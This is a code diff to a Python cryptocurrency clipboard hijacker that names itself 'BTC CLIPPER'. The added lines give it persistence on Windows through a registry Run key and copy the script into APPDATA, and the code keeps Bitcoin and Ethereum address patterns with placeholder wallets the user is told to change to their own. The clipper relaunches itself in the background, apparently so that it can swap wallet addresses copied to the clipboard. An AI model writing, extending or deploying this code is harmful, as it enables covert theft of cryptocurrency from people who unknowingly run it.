@@ -1,11 +1,61 @@
 import os, sys, re, time, subprocess, logging
 
 logging.basicConfig(filename="handler.log", level=logging.INFO, format='%(asctime)s %(message)s')
+
+def IsWindows():
+    try:
+        if os.name == "nt":
+            import winreg, ctypes
+            logging.debug('Adding to startup registry')
+            path = os.getenv('APPDATA')
+
+            logging.debug(path)
+
+            file_name = sys.argv[0]
+
+            address = os.getenv(
+                'LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'
+
+            key1 = winreg.HKEY_CURRENT_USER
+            key_value1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+            open_ = winreg.CreateKeyEx(key1, key_value1, 0, winreg.KEY_WRITE)
+
+            if open_:
+                logging.debug('Registry Key created')
+
+            winreg.SetValueEx(open_, "BTC CLIPPER", 0, winreg.REG_SZ, address)
+
+            open_.Close()
+
+            virus_code = []
+
+            with open(sys.argv[0], 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+                for line in lines:
+                    virus_code.append(line)
+
+            path = os.getenv('APPDATA') + '\\'
+            hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]  # BACK
+            logging.debug('Hide path: %s ' % hide_path)
+
+            with open(hide_path, 'w', encoding='utf-8') as f:
+                for line in virus_code:
+                    f.write(line)
+                    if line == 'FirstTime = True\n':
+                        logging.debug(line)
+                        f.write('FirstTime = False\n')
+
+            logging.debug('Finished replicating to APPDATA')
+
+    except Exception as e:
+        logging.error("Directory / startup registry err {}".format(str(e)))
+
 class Handler:
     def __init__(self):
         self.btc_pattern = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[0-9a-zA-HJ-NP-Z]{11,71}$'
         self.eth_pattern = r'^0x[a-fA-F0-9]{40}$'
-        self.addrs = ["EthereriumWalletHere", "BitCoinWalletHere"]
+        self.addrs = ["EtheriumWalletHere", "BitcoinWalletHere"] # change to your info
         try:
             global pyperclip
             import pyperclip
@@ -48,6 +98,7 @@ def run():
                 subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                  close_fds=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
             elif os.name == "nt":
+                IsWindows()
                 subprocess.Popen([sys.executable] + [sys.argv[0], 'bg'] + sys.argv[1:],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
 
